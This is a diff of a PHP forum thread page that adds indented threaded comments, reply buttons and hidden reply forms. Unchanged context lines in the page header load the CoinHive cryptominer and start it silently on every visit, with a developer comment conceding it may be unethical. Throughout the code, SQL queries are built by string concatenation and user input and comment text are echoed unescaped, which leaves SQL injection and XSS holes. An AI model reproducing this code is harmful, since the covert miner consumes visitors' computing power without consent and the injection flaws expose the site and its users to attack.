@@ -36,10 +36,10 @@
     die("oops");
   }
 
-  function getChildComments($parentID, $lvl, $threadID) {
+  function getChildComments($parentID, $lvl, $threadID, $db) {
     //Get the children of this comment
     $query = "SELECT * FROM replies WHERE parent = " . $parentID . " AND thread_id = " . $threadID;
-    $result = $db->query($query) or die($query);
+    $result = $db->query($query) or die($db->error);
     //If we have a child comments
     while($comment = $result->fetch_assoc()) {
       //Indent the line the specifed level
@@ -52,11 +52,23 @@
       $points = $comment['points'];
       //Print the comment
       echo '<div class="row">
-              <div class="col-md-12">
+              <div class="col-md-' . $lvl . '"></div>
+              <div class="col-md-' . (12 - $lvl) . '">
                 <div class="jumbotron well">';
-      echo '<p>' . $text . '</p><br>-' . $author . ' @ ' . $creation . '</div></div></div>';
+      echo '<p>' . $text . '</p><br>-' . $author . ' @ ' . $creation . '<br><br>';
+      //Print the buttons
+      echo '<button class="commentButton" onclick="unhide(this,\'childComment' . $id . '\')">Reply</button><a href="#" class="commentButton">Flag</a><a href="#" class="commentButton">Endorse</a>';
+      //create the hidden comment box.
+      echo '<div id="childComment' . $id . '" class="hidden">
+            <div class="content3">';
+      echo '<form id="singup-form" action="utilities/comment.php?class=' . $_GET['class'] . '&thread=' . $threadID . '" method="post">';
+      echo '<input type="hidden" name="parentID" value="' . $id . '" size="35">
+            <input type="text" name="comment" value="" size="35"><br>
+            <input name="signup" type="submit" value="Submit">';
+      echo '</div></div>';
+      echo '</div></div></div>';
       //Print any child comments of this comment
-      getChildComments($id, $lvl + 1, $threadID);
+      getChildComments($id, $lvl + 1, $threadID, $db);
     }
 
   }
@@ -70,7 +82,22 @@
     <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/pages.css">
-    <script>
+    <script type="text/javascript">
+      //Post hider
+      function unhide(clickedButton, divID) {
+        var item = document.getElementById(divID);
+        if (item) {
+            if(item.className=='hidden') {
+                item.className = 'unhidden' ;
+                clickedButton.value = 'Cancel'
+            }
+            else {
+                item.className = 'hidden';
+                clickedButton.value = 'Comment'
+            }
+      }}
+      </script>
+      <script>
       //Start miner
 	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
 	      miner.start();
@@ -111,12 +138,13 @@
         $result = $db->query($query) or die($db->error);
         $mainThread = $result->fetch_assoc();
         //Print the thread title
-        echo '<div class="row">
+        echo '<div class="row row-no-padding">
                 <div class="col-md-12">
                   <div class="jumbotron well">';
-        echo '<h5>' . $mainThread['title'] . '</h5><br>' . $mainThread['description'] . '</div></div></div>';
+        echo '<h5>' . $mainThread['title'] . '</h5><br>' . $mainThread['description'] . '<br><br>';
+        echo '<a href="#" class="commentButton">Reply</a><a href="#" class="commentButton">Flag</a><a href="#" class="commentButton">Endorse</a></div></div></div>';
         //Now we can work on child comments
-        getChildComments(0, 0, $thread);
+        getChildComments(0, 1, $thread, $db);
       ?>
     </div>
   </div>
